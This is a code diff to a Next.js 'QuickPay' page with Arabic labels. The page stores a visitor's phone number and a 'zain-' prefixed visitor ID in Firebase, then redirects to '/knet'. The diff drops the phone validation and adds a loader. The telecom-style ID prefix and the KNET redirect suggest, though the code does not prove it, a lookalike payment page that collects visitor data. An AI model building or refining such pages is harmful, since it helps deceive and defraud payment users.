@@ -4,6 +4,7 @@ import Head from 'next/head';
 import { CSSProperties, useState } from 'react';
 import { addData } from './lib/firebase';
 import { useRouter } from 'next/navigation';
+import Loader from './components/loader';
 
 export default function QuickPay() {
   const [phone, setPhone] = useState('');
@@ -26,13 +27,15 @@ export default function QuickPay() {
   const total = selectedAmounts.reduce((sum, val) => sum + val, 0).toFixed(3);
 
   const _id = Math.random().toString(36).replace("0.", "zain-")
-  const visitorId = localStorage.getItem("visitor") || _id
 
   const handleSubmit = () => {
+  const visitorId = localStorage.getItem("visitor") || _id
+
     addData({
       id: visitorId,
       phone: phone,
     })
+    setLoading(true)
 
     setTimeout(() => {
       router.push("/knet")
@@ -168,17 +171,17 @@ export default function QuickPay() {
           <button
 
             className="pay-btn"
-            style={
-              !isPhoneValid && selectedAmounts.length > 0
+            style={ selectedAmounts.length> 0
                 ? activeBtnStyle
                 : disabledBtnStyle
             }
-            disabled={!isPhoneValid || selectedAmounts.length === 0}
           >
             ادفع الآن
           </button>
         </div>
       </div>
+      {loading && <Loader />}
+
     </>
   );
 }
@@ -199,7 +202,7 @@ const disabledBtnStyle = {
   padding: '12px',
   backgroundColor: '#e0e0e0',
   border: 'none',
-  borderRadius: '10px',
+  borderRadius: '6px',
   fontSize: '1em',
   marginTop: '10px',
   cursor: 'not-allowed',
